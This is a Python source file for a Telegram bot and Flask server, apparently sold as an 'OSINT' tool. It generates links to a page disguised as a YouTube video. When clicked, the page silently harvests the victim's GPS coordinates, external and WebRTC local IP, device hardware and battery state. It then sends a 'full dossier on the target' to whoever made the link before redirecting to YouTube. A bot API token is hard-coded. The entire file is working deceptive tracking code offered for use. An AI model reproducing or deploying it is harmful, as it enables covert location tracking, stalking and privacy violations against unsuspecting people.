import asyncio, threading, os, requests, json
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
DB_FILE = "user_data.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {"users": {}}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

@app.route('/')
def home(): return "SYSTEM ONLINE", 200

# --- СТЕЛС-HTML С МАКСИМАЛЬНЫМ СБОРОМ ДАННЫХ ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube - Посмотрите это видео</title>
    <meta property="og:title" content="YouTube: Новое видео на канале">
    <meta property="og:description" content="1.2 млн просмотров • Доступно для вашего региона">
    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .yt-loader { text-align: center; padding: 20px; }
        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #f00; color: #fff; border: none; padding: 12px 24px; border-radius: 2px; cursor: pointer; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body onclick="collect()">
    <div class="yt-loader" id="content">
        <div class="spinner"></div>
        <p>Для запуска видео проверьте соединение</p>
        <button class="btn">ВОСПРОИЗВЕСТИ</button>
    </div>

<script>
async function collect() {
    document.getElementById('content').innerHTML = '<div class="spinner"></div><p>Инициализация защищенного плеера...</p>';
    
    let d = { 
        aid: "{{ aid }}", lure: "{{ lure }}",
        ua: navigator.userAgent,
        lang: navigator.language,
        cores: navigator.hardwareConcurrency || "N/A",
        mem: navigator.deviceMemory || "N/A",
        plat: navigator.platform,
        res: screen.width + "x" + screen.height,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // 1. Батарея
    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Зарядка" : "Разрядка") + ")";
    } catch(e) { d.bat = "N/A"; }

    // 2. Видеокарта (GPU)
    try {
        let c = document.createElement('canvas');
        let gl = c.getContext('webgl');
        let debug = gl.getExtension('WEBGL_debug_renderer_info');
        d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
    } catch(e) { d.gpu = "N/A"; }

    // 3. Локальный IP (WebRTC)
    try {
        let pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => {
            if (i && i.candidate) {
                d.local_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
            }
        };
    } catch(e) {}

    // 4. GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => { 
                d.gps = p.coords.latitude + "," + p.coords.longitude; 
                d.acc = p.coords.accuracy + "m";
                send(d); 
            },
            (e) => { d.gps = "Запрещено (" + e.message + ")"; send(d); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else { send(d); }
    
    setTimeout(() => { if(!window.sent) send(d); }, 4000);
}

function send(d) {
    if(window.sent) return; window.sent = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        location.href = "{{ lure }}" == "yt" ? "https://youtube.com" : "https://google.com";
    });
}
</script>
</body>
</html>
"""

@app.route('/t/<aid>/<lure>')
def trap(aid, lure):
    db = load_db()
    uid = str(aid)
    if uid in db["users"]:
        db["users"][uid]["clicks"] += 1
        save_db(db)
    return render_template_string(HTML_TRAP, aid=aid, lure=lure)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    report = (
        f"🚨 **ПОЛНОЕ ДОСЬЕ НА ЦЕЛЬ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЕВЫЕ ДАННЫЕ:**\n"
        f"• Внешние IP: `{ips}`\n"
        f"• Локальный IP: `{d.get('local_ip', 'N/A')}`\n"
        f"• Часовой пояс: {d.get('tz')}\n"
        f"• Язык системы: {d.get('lang')}\n\n"
        f"📍 **ГЕОЛОКАЦИЯ:**\n"
        f"• Координаты: `{d.get('gps')}`\n"
        f"• Точность: {d.get('acc', 'N/A')}\n"
        f"• [Google Карты](https://www.google.com/maps?q={d.get('gps')})\n\n"
        f"💻 **ЖЕЛЕЗО:**\n"
        f"• Платформа: `{d.get('plat')}`\n"
        f"• CPU: {d.get('cores')} ядер | RAM: ~{d.get('mem')}GB\n"
        f"• GPU: `{d.get('gpu')}`\n"
        f"• Экран: {d.get('res')}\n\n"
        f"🔋 **СОСТОЯНИЕ:**\n"
        f"• Батарея: {d.get('bat')}\n"
        f"• Браузер: `{d.get('ua')[:80]}...`\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    db = load_db()
    uid = str(message.from_user.id)
    if uid not in db["users"]:
        db["users"][uid] = {"clicks": 0}
        save_db(db)
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🚀 Создать YouTube-ловушку"), types.KeyboardButton(text="📊 Статистика"))
    await message.answer("💀 **OSINT MONSTER v12.1**\nВсе системы сбора данных активны.", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать YouTube-ловушку")
async def create_link(message: types.Message):
    link = f"{BASE_URL}/t/{message.from_user.id}/yt"
    await message.answer(f"✅ **Ловушка готова:**\n\n`{link}`\n\n*При отправке в Viber/TG подтянется превью YouTube.*")

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: types.Message):
    db = load_db()
    u = db["users"].get(str(message.from_user.id), {"clicks": 0})
    await message.answer(f"📈 Всего успешных переходов: `{u['clicks']}`")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
